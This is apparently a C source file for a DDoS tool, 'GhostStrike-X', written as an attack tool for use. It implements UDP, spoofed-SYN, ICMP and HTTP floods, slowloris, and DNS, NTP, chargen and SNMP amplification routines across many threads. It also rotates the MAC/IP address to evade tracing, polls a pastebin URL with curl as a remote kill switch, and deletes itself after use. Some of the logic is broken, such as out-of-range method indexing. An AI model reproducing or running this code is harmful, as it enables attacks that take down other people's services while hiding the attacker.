// ghoststrike_x_v4.c — Final Red-Team AI Cyber Tool (Elite Version)

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/ip_icmp.h>
#include <netinet/udp.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <signal.h>
#include <fcntl.h>
#include <time.h>

#define MAX_PACKET_SIZE 8192
#define MAX_THREADS 1024
#define MAX_METHODS 10
volatile int running = 1;

typedef struct
{
    char target[256];
    int port;
    int packets;
    int method;
    int thread_id;
} attack_params;

void ascii_banner()
{
    printf("\033[1;31m");
    printf("██████╗  ██████╗  ██████╗ ███████╗████████╗███████╗██████╗ ██╗ ██╗\n");
    printf("██╔══██╗██╔═══██╗██╔════╝ ██╔════╝╚══██╔══╝██╔════╝██╔══██╗╚═╝ ╚═╝\n");
    printf("██████╔╝██║   ██║██║  ███╗█████╗     ██║   █████╗  ██████╔╝██╗ ██╗\n");
    printf("██╔═══╝ ██║   ██║██║   ██║██╔══╝     ██║   ██╔══╝  ██╔══██╗╚═╝ ╚═╝\n");
    printf("██║     ╚██████╔╝╚██████╔╝███████╗   ██║   ███████╗██║  ██║██╗ ██╗\n");
    printf("╚═╝      ╚═════╝  ╚═════╝ ╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝ ╚═╝\n");
    printf("\033[0m");
    printf("       \033[1;30m[GhostStrike-X v4] All-Method Black-Box Simulator\033[0m\n\n");
}

void secure_login()
{
    char user_input[30], pass_input[30];
    const char *user = "Devil";
    const char *pass = "Devil@2025";
    printf("\033[1;30mLogin required:\033[0m\nUsername: ");
    fgets(user_input, sizeof(user_input), stdin);
    user_input[strcspn(user_input, "\n")] = 0;
    printf("Password: ");
    system("stty -echo");
    fgets(pass_input, sizeof(pass_input), stdin);
    pass_input[strcspn(pass_input, "\n")] = 0;
    system("stty echo");
    printf("\n");
    if (strcmp(user_input, user) || strcmp(pass_input, pass))
    {
        printf("\033[1;31m[!] Access Denied.\033[0m\n");
        exit(1);
    }
    printf("\033[1;32m[✔] Access Granted. Welcome, Ghost.\033[0m\n\n");
}

void xor_decrypt(char *data, char key)
{
    for (int i = 0; data[i]; i++)
        data[i] ^= key;
}

void check_kill_switch()
{
    char buffer[512];
    FILE *fp = popen("curl -s https://pastebin.com/raw/ghostkill", "r");
    if (!fp)
        return;
    fread(buffer, 1, sizeof(buffer), fp);
    pclose(fp);
    xor_decrypt(buffer, 0x5A);
    if (strstr(buffer, "KILL") != NULL)
    {
        printf("\033[1;31m\n[✖] Remote kill signal received. Self-destructing.\033[0m\n");
        unlink("./ghoststrike_x");
        exit(0);
    }
}

void *kill_monitor(void *arg)
{
    while (running)
    {
        check_kill_switch();
        sleep(20);
    }
    return NULL;
}

void rotate_identity()
{
    system("sudo ifconfig eth0 down");
    system("sudo macchanger -r eth0 > /dev/null");
    system("sudo ifconfig eth0 up");
    system("sudo dhclient eth0 > /dev/null 2>&1");
    printf("\033[1;36m[+] MAC/IP changed.\033[0m\n");
}

void *identity_loop(void *interval_ptr)
{
    int interval = *((int *)interval_ptr);
    while (running)
    {
        sleep(interval);
        rotate_identity();
    }
    return NULL;
}

void handle_interrupt(int sig)
{
    running = 0;
    printf("\n\033[1;31m[!] Ctrl+C detected. Exiting GhostStrike-X.\033[0m\n");
    exit(0);
}

// ---------- DDoS ATTACK FUNCTIONS ---------- //

void *udp_flood(void *arg)
{
    attack_params *a = (attack_params *)arg;
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(a->port);
    target.sin_addr.s_addr = inet_addr(a->target);
    char packet[MAX_PACKET_SIZE];
    memset(packet, rand() % 256, MAX_PACKET_SIZE);

    while (running)
    {
        for (int i = 0; i < a->packets; i++)
        {
            sendto(sock, packet, MAX_PACKET_SIZE, 0, (struct sockaddr *)&target, sizeof(target));
            printf("\033[1;32m[UDP][T%d] Sent ➤ %s:%d\033[0m\n", a->thread_id, a->target, a->port);
        }
    }
    close(sock);
    return NULL;
}

void *syn_flood(void *arg)
{
    attack_params *a = (attack_params *)arg;
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0)
        pthread_exit(NULL);

    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(a->port);
    target.sin_addr.s_addr = inet_addr(a->target);

    char packet[4096];
    while (running)
    {
        for (int i = 0; i < a->packets; i++)
        {
            memset(packet, 0, 4096);
            struct iphdr *iph = (struct iphdr *)packet;
            struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));

            iph->ihl = 5;
            iph->version = 4;
            iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
            iph->ttl = 64;
            iph->protocol = IPPROTO_TCP;
            iph->saddr = rand(); // spoofed IP
            iph->daddr = target.sin_addr.s_addr;

            tcph->source = htons(rand() % 65535);
            tcph->dest = htons(a->port);
            tcph->seq = rand();
            tcph->syn = 1;
            tcph->window = htons(14600);

            sendto(sock, packet, ntohs(iph->tot_len), 0, (struct sockaddr *)&target, sizeof(target));
            printf("\033[1;34m[SYN][T%d] Sent ➤ %s:%d\033[0m\n", a->thread_id, a->target, a->port);
        }
    }
    close(sock);
    return NULL;
}

void *icmp_flood(void *arg)
{
    attack_params *a = (attack_params *)arg;
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_addr.s_addr = inet_addr(a->target);
    char packet[64];
    memset(packet, rand() % 255, 64);

    while (running)
    {
        for (int i = 0; i < a->packets; i++)
        {
            sendto(sock, packet, 64, 0, (struct sockaddr *)&target, sizeof(target));
            printf("\033[1;35m[ICMP][T%d] Ping ➤ %s\033[0m\n", a->thread_id, a->target);
        }
    }
    close(sock);
    return NULL;
}

void *http_get_flood(void *arg)
{
    attack_params *a = (attack_params *)arg;
    struct hostent *host = gethostbyname(a->target);
    if (!host)
        pthread_exit(NULL);

    while (running)
    {
        for (int i = 0; i < a->packets; i++)
        {
            int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            struct sockaddr_in server;
            server.sin_family = AF_INET;
            server.sin_port = htons(a->port);
            server.sin_addr = *((struct in_addr *)host->h_addr);

            if (connect(sock, (struct sockaddr *)&server, sizeof(server)) == 0)
            {
                char req[512];
                snprintf(req, sizeof(req), "GET / HTTP/1.1\r\nHost: %s\r\nConnection: Keep-Alive\r\n\r\n", a->target);
                send(sock, req, strlen(req), 0);
                printf("\033[1;36m[HTTP][T%d] Sent GET to %s:%d\033[0m\n", a->thread_id, a->target, a->port);
            }
            close(sock);
        }
    }
    return NULL;
}

void *slowloris_attack(void *arg)
{
    attack_params *a = (attack_params *)arg;
    while (running)
    {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        struct sockaddr_in serv;
        serv.sin_family = AF_INET;
        serv.sin_port = htons(a->port);
        serv.sin_addr.s_addr = inet_addr(a->target);
        if (connect(sock, (struct sockaddr *)&serv, sizeof(serv)) == 0)
        {
            char buf[256];
            snprintf(buf, sizeof(buf), "POST / HTTP/1.1\r\nHost: %s\r\nContent-Length: 10000\r\n", a->target);
            send(sock, buf, strlen(buf), 0);
            for (int i = 0; i < a->packets; i++)
            {
                send(sock, "X-a: b\r\n", 8, 0);
                printf("\033[1;33m[SLOW][T%d] Partial header sent ➤ %s:%d\033[0m\n", a->thread_id, a->target, a->port);
                usleep(500000);
            }
        }
        close(sock);
    }
    return NULL;
}

void *dns_amp_attack(void *arg)
{
    attack_params *a = (attack_params *)arg;
    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(a->port);
    target.sin_addr.s_addr = inet_addr(a->target);
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

    char query[] = "\xAA\xAA\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
                   "\x07"
                   "example\x03"
                   "com\x00\x00\xff\x00\x01";

    while (running)
    {
        sendto(sock, query, sizeof(query), 0, (struct sockaddr *)&target, sizeof(target));
        printf("\033[1;37m[DNSAMP][T%d] Spoofed request sent ➤ %s:%d\033[0m\n", a->thread_id, a->target, a->port);
        usleep(50000);
    }
    close(sock);
    return NULL;
}

void *ntp_amp_attack(void *arg)
{
    attack_params *a = (attack_params *)arg;
    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(123);
    target.sin_addr.s_addr = inet_addr(a->target);
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    char payload[] = "\x17\x00\x03\x2a";

    while (running)
    {
        sendto(sock, payload, sizeof(payload), 0, (struct sockaddr *)&target, sizeof(target));
        printf("\033[1;35m[NTPAMP][T%d] Spoofed request sent ➤ %s\033[0m\n", a->thread_id, a->target);
        usleep(50000);
    }
    close(sock);
    return NULL;
}

void *chargen_amp_attack(void *arg)
{
    attack_params *a = (attack_params *)arg;
    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(19);
    target.sin_addr.s_addr = inet_addr(a->target);
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    char c = 'A';

    while (running)
    {
        sendto(sock, &c, 1, 0, (struct sockaddr *)&target, sizeof(target));
        printf("\033[1;31m[CHARGEN][T%d] Character sent ➤ %s:19\033[0m\n", a->thread_id, a->target);
        usleep(50000);
    }
    close(sock);
    return NULL;
}

void *snmp_amp_attack(void *arg)
{
    attack_params *a = (attack_params *)arg;
    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(161);
    target.sin_addr.s_addr = inet_addr(a->target);
    int sock = socket(AF_INET, SOCK_DGRAM, 0);

    char payload[] = "\x30\x26\x02\x01\x01\x04\x06\x70\x75\x62\x6c\x69\x63\xa0"
                     "\x19\x02\x04\x71\x79\x06\x93\x02\x01\x00\x02\x01\x00\x30"
                     "\x0b\x30\x09\x06\x05\x2b\x06\x01\x02\x01\x05\x00";

    while (running)
    {
        sendto(sock, payload, sizeof(payload), 0, (struct sockaddr *)&target, sizeof(target));
        printf("\033[1;90m[SNMPAMP][T%d] SNMP payload ➤ %s:161\033[0m\n", a->thread_id, a->target);
        usleep(50000);
    }
    close(sock);
    return NULL;
}

void *launch_thread(void *args)
{
    attack_params *a = (attack_params *)args;
    switch (a->method)
    {
    case 0:
        return udp_flood(a);
    case 1:
        return syn_flood(a);
    case 2:
        return icmp_flood(a);
    case 3:
        return http_get_flood(a);
    case 4:
        return slowloris_attack(a);
    case 5:
        return dns_amp_attack(a);
    case 6:
        return ntp_amp_attack(a);
    case 7:
        return chargen_amp_attack(a);
    case 8:
        return snmp_amp_attack(a);
    default:
        pthread_exit(NULL);
    }
}

int main(int argc, char *argv[])
{
    signal(SIGINT, handle_interrupt);
    srand(time(NULL));
    ascii_banner();
    secure_login();

    pthread_t kill_thread;
    pthread_create(&kill_thread, NULL, kill_monitor, NULL);

    char target[256], method_input[64], dur_input[10];
    int port, threads, packets, duration = 0, interval;

    printf("Target IP: ");
    fgets(target, sizeof(target), stdin);
    target[strcspn(target, "\n")] = 0;
    printf("Port (if N/A, put 0): ");
    scanf("%d", &port);
    getchar();
    printf("Methods (0-8) comma-separated (max 3): ");
    fgets(method_input, sizeof(method_input), stdin);
    printf("Threads: ");
    scanf("%d", &threads);
    getchar();
    printf("Packets per thread: ");
    scanf("%d", &packets);
    getchar();
    printf("Duration (0=infinite): ");
    fgets(dur_input, sizeof(dur_input), stdin);
    printf("Change IP/MAC every X seconds: ");
    scanf("%d", &interval);
    getchar();

    if (dur_input[0] != '\n')
        duration = atoi(dur_input);

    int methods[3] = {-1, -1, -1};
    sscanf(method_input, "%d,%d,%d", &methods[0], &methods[1], &methods[2]);

    pthread_t identity_thread;
    pthread_create(&identity_thread, NULL, identity_loop, &interval);

    for (int i = 0; i < threads; i++)
    {
        attack_params *args = malloc(sizeof(attack_params));
        strcpy(args->target, target);
        args->port = port;
        args->packets = packets;
        args->thread_id = i;
        args->method = methods[i % MAX_METHODS];

        pthread_t tid;
        pthread_create(&tid, NULL, launch_thread, args);
    }

    if (duration > 0)
    {
        sleep(duration);
        running = 0;
    }

    printf("\n\033[1;31m[✓] Attack finished. Shutting down...\033[0m\n");
    unlink(argv[0]); // Self-delete
    return 0;
}
